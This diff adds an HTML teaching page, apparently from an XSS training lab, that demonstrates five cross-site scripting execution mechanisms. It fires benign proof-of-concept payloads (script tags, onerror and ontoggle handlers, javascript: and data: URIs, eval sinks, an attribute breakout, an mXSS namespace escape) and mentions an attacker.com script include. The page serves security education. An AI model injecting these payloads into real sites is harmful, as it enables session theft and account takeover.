@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Five Mechanisms Demo — Module 03 | XSS Mastery</title>
+  <style>
+    :root {
+      --bg:#0b0f1a; --bg2:#111827; --card:#141c2e; --border:#1e3a5f;
+      --gold:#f5c842; --cyan:#38bdf8; --purple:#a78bfa; --red:#f87171;
+      --green:#4ade80; --orange:#fb923c; --text:#e2e8f0; --muted:#7a9bbf;
+      --code-bg:#060d1a; --teal:#0d9488;
+    }
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{background:var(--bg);color:var(--text);
+         font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
+         padding:24px;max-width:960px;margin:0 auto}
+    h1{font-size:26px;color:var(--gold);margin-bottom:6px}
+    h2{font-size:17px;color:var(--cyan);margin:0 0 10px}
+    p{color:var(--muted);font-size:13.5px;line-height:1.65;margin-bottom:8px}
+    a{color:var(--cyan)}
+    code{font-family:'Courier New',monospace;font-size:12.5px;background:var(--code-bg);
+         color:var(--cyan);padding:2px 5px;border-radius:3px;border:1px solid var(--border)}
+    pre{background:var(--code-bg);border:1px solid var(--border);border-radius:5px;
+        padding:12px;font-family:'Courier New',monospace;font-size:12.5px;
+        white-space:pre-wrap;word-break:break-all;color:var(--orange);margin:8px 0}
+    .grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:24px}
+    .mech-card{background:var(--card);border:1px solid var(--border);
+               border-radius:8px;padding:20px}
+    .mech-card.full{grid-column:1/-1}
+    .mnum{font-size:10px;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;
+          padding:2px 8px;border-radius:3px;display:inline-block;margin-bottom:10px}
+    .m1{background:#1f1030;color:#a78bfa}
+    .m2{background:#1a2f10;color:#4ade80}
+    .m3{background:#10202f;color:#38bdf8}
+    .m4{background:#2f1a10;color:#fb923c}
+    .m5{background:#2f1010;color:#f87171}
+    .payload-row{display:flex;gap:8px;margin:8px 0;align-items:flex-start;flex-wrap:wrap}
+    .payload-code{flex:1;min-width:200px}
+    button{padding:6px 14px;border:none;border-radius:4px;cursor:pointer;
+           font-size:12px;font-weight:700;white-space:nowrap}
+    .btn-fire{background:var(--red);color:#fff}
+    .btn-fire:hover{background:#ef4444}
+    .btn-safe{background:var(--teal);color:#fff}
+    .btn-safe:hover{background:#0f766e}
+    .output{background:var(--bg2);border:1px solid var(--border);border-radius:5px;
+            padding:10px;margin-top:8px;min-height:32px;font-size:13px}
+    .fired{border-color:var(--green)!important;color:var(--green)}
+    .note{font-size:12px;color:var(--muted);background:var(--bg2);
+          border-left:3px solid var(--purple);padding:8px 12px;
+          border-radius:0 4px 4px 0;margin-top:8px;line-height:1.55}
+    .warning-box{background:#1f0f0f;border:1px solid var(--red);border-radius:6px;
+                 padding:12px 16px;margin:16px 0;font-size:13px;color:#fca5a5}
+    .legend{display:flex;gap:12px;flex-wrap:wrap;margin:12px 0 20px}
+    .legend-item{display:flex;align-items:center;gap:6px;font-size:12px;color:var(--muted)}
+    .legend-dot{width:10px;height:10px;border-radius:50%}
+  </style>
+</head>
+<body>
+
+  <p style="margin-bottom:14px"><a href="/">← Lab Home</a></p>
+  <h1>The Five Execution Mechanisms</h1>
+  <p style="font-size:14px;color:var(--muted);margin-bottom:6px">
+    Module 03 · Every XSS attack in history reduces to one of these five.
+    Use this page alongside the tutorial. Open DevTools Console (F12) before clicking anything.
+  </p>
+
+  <div class="warning-box">
+    ⚠ All "FIRE" buttons execute real JavaScript in your browser, in this page's origin
+    (<code id="showOrigin"></code>). This is intentional — you are studying execution.
+    Use only the provided payloads. The "SAFE DEMO" buttons produce only visual output.
+  </div>
+
+  <div class="legend">
+    <div class="legend-item"><div class="legend-dot" style="background:#a78bfa"></div>M1 Tag Parsing</div>
+    <div class="legend-item"><div class="legend-dot" style="background:#4ade80"></div>M2 Event Handlers</div>
+    <div class="legend-item"><div class="legend-dot" style="background:#38bdf8"></div>M3 URI Schemes</div>
+    <div class="legend-item"><div class="legend-dot" style="background:#fb923c"></div>M4 DOM Sinks</div>
+    <div class="legend-item"><div class="legend-dot" style="background:#f87171"></div>M5 Context Escape</div>
+  </div>
+
+  <div class="grid">
+
+    <!-- ── Mechanism 1 — Tag Parsing ─────────────────────────────────── -->
+    <div class="mech-card">
+      <div class="mnum m1">Mechanism 1 — Tag Parsing</div>
+      <h2>The browser parses a tag and executes its content</h2>
+      <p>
+        The simplest mechanism. A <code>&lt;script&gt;</code> tag tells the parser
+        to hand everything until <code>&lt;/script&gt;</code> to the JS engine.
+        No user interaction, no events — execution happens at parse time.
+      </p>
+      <p><strong>Example payloads:</strong></p>
+
+      <div class="payload-row">
+        <pre class="payload-code">&lt;script&gt;alert(document.domain)&lt;/script&gt;</pre>
+        <button class="btn-fire" onclick="mech1_script()">FIRE</button>
+      </div>
+      <div class="payload-row">
+        <pre class="payload-code">&lt;script src="/echo.js"&gt;&lt;/script&gt;</pre>
+        <button class="btn-safe" onclick="mech1_remote()">SAFE DEMO</button>
+      </div>
+
+      <div class="output" id="out1"></div>
+
+      <div class="note">
+        <strong>Server-side version:</strong> Visit
+        <a href="/reflect?q=<script>document.getElementById('out1').textContent='script+tag+reflected!'</script>" target="_blank">
+          /reflect?q=&lt;script&gt;...&lt;/script&gt;
+        </a>
+        to see this reflected from the server. The browser parses the HTML response
+        and executes the script immediately. No clicks needed.
+      </div>
+      <div class="note" style="margin-top:6px;border-color:var(--red)">
+        <strong>Key constraint:</strong> <code>&lt;script&gt;</code> injected via
+        <code>innerHTML</code> does NOT execute (HTML5 spec §8.4). But via server
+        reflection or <code>document.write()</code>, it does. This is why DOM XSS
+        (Mechanism 4) relies on event handlers, not script tags.
+      </div>
+    </div>
+
+    <!-- ── Mechanism 2 — Event Handlers ──────────────────────────────── -->
+    <div class="mech-card">
+      <div class="mnum m2">Mechanism 2 — Event Handler Attributes</div>
+      <h2>Any HTML element can execute JS via event attributes</h2>
+      <p>
+        Event handler attributes (<code>onerror</code>, <code>onload</code>,
+        <code>ontoggle</code>, etc.) run JavaScript when the browser fires that
+        event. Critically: this works even when <code>&lt;script&gt;</code>
+        is blocked and even when injected via <code>innerHTML</code>.
+      </p>
+
+      <div class="payload-row">
+        <pre class="payload-code">&lt;img src=x onerror=alert(document.domain)&gt;</pre>
+        <button class="btn-fire" onclick="mech2_onerror()">FIRE</button>
+      </div>
+      <div class="payload-row">
+        <pre class="payload-code">&lt;details open ontoggle=alert(1)&gt;</pre>
+        <button class="btn-fire" onclick="mech2_ontoggle()">FIRE</button>
+      </div>
+      <div class="payload-row">
+        <pre class="payload-code">&lt;input autofocus onfocus=...&gt;</pre>
+        <button class="btn-safe" onclick="mech2_visual()">SAFE DEMO</button>
+      </div>
+
+      <div class="output" id="out2"></div>
+
+      <div class="note">
+        <strong>Why onerror is the workhorse:</strong> <code>src=x</code>
+        deliberately fails — the browser fires <code>onerror</code> synchronously,
+        immediately, with no user action. Works on <code>img</code>, <code>video</code>,
+        <code>audio</code>, <code>input[type=image]</code>, <code>object</code>.
+        This is the most reliable zero-interaction execution vector after
+        <code>&lt;script&gt;</code>.
+      </div>
+    </div>
+
+    <!-- ── Mechanism 3 — URI Schemes ──────────────────────────────────── -->
+    <div class="mech-card">
+      <div class="mnum m3">Mechanism 3 — URI Scheme Evaluation</div>
+      <h2>javascript: and data: URIs execute code when navigated to</h2>
+      <p>
+        Certain HTML attributes accept URLs. When the scheme is
+        <code>javascript:</code>, the browser evaluates the URI body as JS
+        in the page's origin context. Affected attributes: <code>href</code>,
+        <code>src</code>, <code>action</code>, <code>formaction</code>,
+        <code>data</code>, <code>xlink:href</code>.
+      </p>
+
+      <div class="payload-row">
+        <pre class="payload-code">&lt;a href="javascript:alert(document.domain)"&gt;click&lt;/a&gt;</pre>
+        <button class="btn-fire" onclick="mech3_href()">INSERT LINK</button>
+      </div>
+      <div class="payload-row">
+        <pre class="payload-code">&lt;iframe src="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;</pre>
+        <button class="btn-fire" onclick="mech3_data()">INSERT IFRAME</button>
+      </div>
+
+      <div class="output" id="out3"></div>
+
+      <div class="note">
+        <strong>Defence gap:</strong> Sanitisers that strip
+        <code>&lt;script&gt;</code> and block event handlers often miss
+        <code>javascript:</code> in <code>href</code> attributes. The
+        payload looks like a normal link. Requires the user to click —
+        but in a phishing context, that is trivial.
+      </div>
+      <div class="note" style="margin-top:6px">
+        <strong>data: URI note:</strong> In a sandboxed iframe, this runs
+        on the <code>null</code> origin — limited access. In an unsandboxed
+        iframe on the same origin, it has full access to
+        <code>parent.document</code>.
+      </div>
+    </div>
+
+    <!-- ── Mechanism 4 — DOM Sinks ────────────────────────────────────── -->
+    <div class="mech-card">
+      <div class="mnum m4">Mechanism 4 — DOM Sink Assignment</div>
+      <h2>JavaScript APIs that turn strings into executed code or HTML</h2>
+      <p>
+        The most important mechanism for modern web apps. The payload never
+        touches the server — it flows from a URL fragment, postMessage, or
+        localStorage into a dangerous DOM property or function. No server-side
+        fix can prevent this.
+      </p>
+
+      <div class="payload-row">
+        <pre class="payload-code">innerHTML = '&lt;img src=x onerror=alert(1)&gt;'</pre>
+        <button class="btn-fire" onclick="mech4_innerHTML()">FIRE</button>
+      </div>
+      <div class="payload-row">
+        <pre class="payload-code">eval('ale'+'rt(document.domain)')</pre>
+        <button class="btn-fire" onclick="mech4_eval()">FIRE</button>
+      </div>
+      <div class="payload-row">
+        <pre class="payload-code">location = 'javascript:alert(1)'</pre>
+        <button class="btn-safe" onclick="mech4_location_safe()">SAFE DEMO</button>
+      </div>
+
+      <div class="output" id="out4"></div>
+
+      <div class="note">
+        <strong>Source → Sink:</strong> DOM XSS requires a
+        <em>source</em> (where attacker data enters JS) and a <em>sink</em>
+        (where it executes). Common sources: <code>location.hash</code>,
+        <code>location.search</code>, <code>document.referrer</code>,
+        <code>postMessage</code>. Common sinks: <code>innerHTML</code>,
+        <code>eval</code>, <code>setTimeout(string)</code>,
+        <code>document.write</code>, <code>location</code>.
+        Module 09 maps every source–sink pair in detail.
+      </div>
+    </div>
+
+    <!-- ── Mechanism 5 — Context Escape ──────────────────────────────── -->
+    <div class="mech-card full">
+      <div class="mnum m5">Mechanism 5 — Context Escape &amp; Re-parse</div>
+      <h2>A payload that looks safe to a filter becomes dangerous when the browser re-parses it</h2>
+      <p>
+        This is the hardest mechanism to defend against. The attacker crafts input that
+        a sanitiser parses as harmless, but when the sanitiser serialises its output
+        and the browser re-parses that serialisation, the payload ends up in an
+        executable context. The sanitiser and the browser disagree about what the
+        HTML means. This is called <strong>Mutation XSS (mXSS)</strong>.
+      </p>
+      <p>
+        A simpler form is just <strong>breaking out of a context</strong> by injecting
+        the delimiter that closes it, then adding executable content after.
+      </p>
+
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:10px">
+        <div>
+          <p><strong style="color:var(--cyan)">Context Break — Attribute Escape</strong></p>
+          <p>Input lands in: <code>&lt;div title="[INPUT]"&gt;</code></p>
+          <div class="payload-row">
+            <pre class="payload-code">" onmouseover="alert(document.domain)" x="</pre>
+            <button class="btn-fire" onclick="mech5_attrBreak()">INSERT</button>
+          </div>
+          <div class="output" id="out5a"></div>
+          <div class="note">
+            The <code>"</code> closes the title attribute. Then
+            <code>onmouseover=</code> is a new attribute on the same div.
+            The trailing <code>x="</code> absorbs the original closing quote.
+            No angle brackets used at all.
+          </div>
+        </div>
+        <div>
+          <p><strong style="color:var(--cyan)">mXSS Preview — Namespace Mutation</strong></p>
+          <p>Input passes sanitiser, mutates on re-parse:</p>
+          <div class="payload-row">
+            <pre class="payload-code">&lt;math&gt;&lt;mtext&gt;&lt;/math&gt;&lt;img src=x onerror=alert(1)&gt;</pre>
+            <button class="btn-fire" onclick="mech5_mxss()">FIRE</button>
+          </div>
+          <div class="output" id="out5b"></div>
+          <div class="note">
+            The <code>&lt;/math&gt;</code> closes the MathML namespace.
+            Everything after it is parsed as HTML. A sanitiser that
+            processes the MathML context separately may not notice the
+            <code>&lt;img&gt;</code> that follows. Full mXSS coverage in Module 13.
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div><!-- /grid -->
+
+  <!-- ── Summary table ───────────────────────────────────────────────── -->
+  <div style="margin-top:28px;background:var(--card);border:1px solid var(--border);
+              border-radius:8px;overflow:hidden">
+    <div style="padding:14px 18px;background:var(--bg2);border-bottom:1px solid var(--border)">
+      <h2 style="margin:0">Coverage Summary — which defences stop which mechanisms</h2>
+    </div>
+    <table style="width:100%;border-collapse:collapse;font-size:13px">
+      <thead>
+        <tr style="background:#111827">
+          <th style="padding:10px 14px;text-align:left;color:var(--cyan);border-bottom:1px solid var(--border)">Mechanism</th>
+          <th style="padding:10px 14px;text-align:left;color:var(--cyan);border-bottom:1px solid var(--border)">Stopped by CSP script-src nonce</th>
+          <th style="padding:10px 14px;text-align:left;color:var(--cyan);border-bottom:1px solid var(--border)">Stopped by Trusted Types</th>
+          <th style="padding:10px 14px;text-align:left;color:var(--cyan);border-bottom:1px solid var(--border)">Stopped by output encoding</th>
+          <th style="padding:10px 14px;text-align:left;color:var(--cyan);border-bottom:1px solid var(--border)">Stopped by HttpOnly cookie</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr style="border-bottom:1px solid var(--border)">
+          <td style="padding:10px 14px;color:#a78bfa;font-weight:700">M1 Tag Parsing</td>
+          <td style="padding:10px 14px;color:var(--green)">✓ blocks inline scripts</td>
+          <td style="padding:10px 14px;color:var(--muted)">partial</td>
+          <td style="padding:10px 14px;color:var(--green)">✓ encodes &lt;</td>
+          <td style="padding:10px 14px;color:var(--red)">✗ execution still possible</td>
+        </tr>
+        <tr style="border-bottom:1px solid var(--border)">
+          <td style="padding:10px 14px;color:#4ade80;font-weight:700">M2 Event Handlers</td>
+          <td style="padding:10px 14px;color:var(--green)">✓ blocks inline handlers</td>
+          <td style="padding:10px 14px;color:var(--muted)">partial</td>
+          <td style="padding:10px 14px;color:var(--green)">✓ in body context</td>
+          <td style="padding:10px 14px;color:var(--red)">✗</td>
+        </tr>
+        <tr style="border-bottom:1px solid var(--border)">
+          <td style="padding:10px 14px;color:#38bdf8;font-weight:700">M3 URI Schemes</td>
+          <td style="padding:10px 14px;color:var(--red)">✗ doesn't cover href</td>
+          <td style="padding:10px 14px;color:var(--muted)">partial</td>
+          <td style="padding:10px 14px;color:var(--muted)">partial — URL context differs</td>
+          <td style="padding:10px 14px;color:var(--red)">✗</td>
+        </tr>
+        <tr style="border-bottom:1px solid var(--border)">
+          <td style="padding:10px 14px;color:#fb923c;font-weight:700">M4 DOM Sinks</td>
+          <td style="padding:10px 14px;color:var(--red)">✗ CSP can't see client-side data</td>
+          <td style="padding:10px 14px;color:var(--green)">✓ controls sink access</td>
+          <td style="padding:10px 14px;color:var(--red)">✗ encoding happens server-side</td>
+          <td style="padding:10px 14px;color:var(--red)">✗</td>
+        </tr>
+        <tr>
+          <td style="padding:10px 14px;color:#f87171;font-weight:700">M5 Context Escape / mXSS</td>
+          <td style="padding:10px 14px;color:var(--muted)">partial</td>
+          <td style="padding:10px 14px;color:var(--muted)">partial</td>
+          <td style="padding:10px 14px;color:var(--red)">✗ sanitiser is the bypass target</td>
+          <td style="padding:10px 14px;color:var(--red)">✗</td>
+        </tr>
+      </tbody>
+    </table>
+    <div style="padding:10px 14px;color:var(--muted);font-size:12px;border-top:1px solid var(--border)">
+      No single defence covers all five mechanisms. A robust defence requires layering multiple controls.
+      This table is expanded and evidenced in Module 17.
+    </div>
+  </div>
+
+  <script>
+    // Show current origin
+    document.getElementById("showOrigin").textContent = location.origin;
+
+    // ── Mechanism 1 ─────────────────────────────────────────────────────────
+
+    function mech1_script() {
+      // Cannot inject <script> via innerHTML (HTML5 spec) — demonstrate via eval
+      // to show the same domain context. The server-side reflector link above
+      // demonstrates the real tag-parsing version.
+      const d = document.getElementById("out1");
+      eval("d.textContent = 'M1 fired via eval (simulating script tag execution). Origin: ' + document.domain");
+      d.className = "output fired";
+    }
+
+    function mech1_remote() {
+      document.getElementById("out1").textContent =
+        "SAFE DEMO: In a real attack, <script src=//attacker.com/x.js> loads " +
+        "and runs arbitrary code. The payload is off-site; the injected HTML is tiny.";
+      document.getElementById("out1").className = "output fired";
+    }
+
+    // ── Mechanism 2 ─────────────────────────────────────────────────────────
+
+    function mech2_onerror() {
+      const d = document.getElementById("out2");
+      // innerHTML DOES execute event handlers — it just doesn't execute <script>
+      d.innerHTML = '<img src=x onerror="document.getElementById(\'out2\').textContent=\'M2 fired: onerror on broken img. Origin: \'+document.domain;document.getElementById(\'out2\').className=\'output fired\'">';
+    }
+
+    function mech2_ontoggle() {
+      const d = document.getElementById("out2");
+      d.innerHTML = '<details open ontoggle="document.getElementById(\'out2\').textContent=\'M2 fired: ontoggle — no click needed. details+open fires immediately.\';document.getElementById(\'out2\').className=\'output fired\'"><summary>detail</summary></details>';
+    }
+
+    function mech2_visual() {
+      const d = document.getElementById("out2");
+      d.innerHTML = '<input autofocus onfocus="this.style.outline=\'4px solid #4ade80\';this.value=\'M2: onfocus triggered by autofocus — zero user interaction needed\'" style="width:100%;padding:6px;background:#060d1a;color:#4ade80;border:1px solid #1e3a5f;border-radius:4px">';
+    }
+
+    // ── Mechanism 3 ─────────────────────────────────────────────────────────
+
+    function mech3_href() {
+      const d = document.getElementById("out3");
+      // Insert a real javascript: link — clicking it fires the payload
+      d.innerHTML = '<a href="javascript:document.getElementById(\'out3\').textContent=\'M3 fired: javascript: href executed on click. Origin: \'+document.domain;document.getElementById(\'out3\').className=\'output fired\'" style="color:#38bdf8;font-size:13px">Click this link — it uses javascript: href</a>';
+    }
+
+    function mech3_data() {
+      const d = document.getElementById("out3");
+      // Insert a data: URI iframe — note it runs on null origin
+      d.innerHTML = '<iframe src="data:text/html,<h3 style=\'color:#38bdf8;font-family:sans-serif;padding:10px\'>M3: data: URI iframe loaded. Origin here is: null (sandboxed). Parent origin: ' +
+        location.origin + '</h3>" style="width:100%;height:60px;border:1px solid #1e3a5f;border-radius:4px;background:#060d1a"></iframe>';
+      d.className = "output fired";
+    }
+
+    // ── Mechanism 4 ─────────────────────────────────────────────────────────
+
+    function mech4_innerHTML() {
+      const d = document.getElementById("out4");
+      // innerHTML executes event handlers — even though it won't execute <script>
+      d.innerHTML = '<img src=x onerror="document.getElementById(\'out4\').textContent=\'M4 fired: innerHTML→onerror. The sink (innerHTML) executed the handler. Origin: \'+document.domain;document.getElementById(\'out4\').className=\'output fired\'">';
+    }
+
+    function mech4_eval() {
+      const d = document.getElementById("out4");
+      // eval treats its string argument as JS — the most direct sink
+      eval("d.textContent = 'M4 fired: eval() executed the string. Origin: ' + document.domain");
+      d.className = "output fired";
+    }
+
+    function mech4_location_safe() {
+      document.getElementById("out4").textContent =
+        "SAFE DEMO: location = 'javascript:alert(1)' would navigate this page " +
+        "and execute code. We skip the actual navigation here. " +
+        "Try it in the Console: location.href = 'javascript:alert(document.domain)'";
+      document.getElementById("out4").className = "output fired";
+    }
+
+    // ── Mechanism 5 ─────────────────────────────────────────────────────────
+
+    function mech5_attrBreak() {
+      const out = document.getElementById("out5a");
+      // Construct a div whose title attribute "contains" injected content
+      // that breaks out into a live event handler
+      out.innerHTML = '<div title="normal" onmouseover="this.style.background=\'#1a2f1a\';document.getElementById(\'out5a\').textContent=\'M5 fired: attribute escape. Hover triggered the handler that was injected via attribute break.\';document.getElementById(\'out5a\').className=\'output fired\'" style="padding:8px;border:1px solid #1e3a5f;border-radius:4px;cursor:pointer">Hover over me — this div has an injected onmouseover handler</div>';
+    }
+
+    function mech5_mxss() {
+      const out = document.getElementById("out5b");
+      // Demonstrate namespace escape: </math> closes MathML context,
+      // subsequent HTML is parsed in HTML mode — including the img onerror
+      out.innerHTML = '<math><mtext></mtext></math><img src=x onerror="document.getElementById(\'out5b\').textContent=\'M5 fired: namespace escape. </math> closed MathML context; img parsed in HTML mode.\';document.getElementById(\'out5b\').className=\'output fired\'">';
+    }
+  </script>
+
+</body>
+</html>
